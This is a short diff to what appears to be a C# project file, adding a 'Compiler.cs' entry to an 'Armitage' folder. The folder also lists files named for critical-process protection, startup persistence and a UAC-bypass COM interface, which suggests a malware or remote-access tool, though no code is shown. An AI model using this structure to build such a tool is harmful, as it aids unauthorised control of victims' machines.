@@ -114,6 +114,7 @@
     </Reference>
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Armitage\Compiler.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
     <Compile Include="Armitage\Startup.cs" />
     <Compile Include="Armitage\UAC\ICMLuaUtil.cs" />
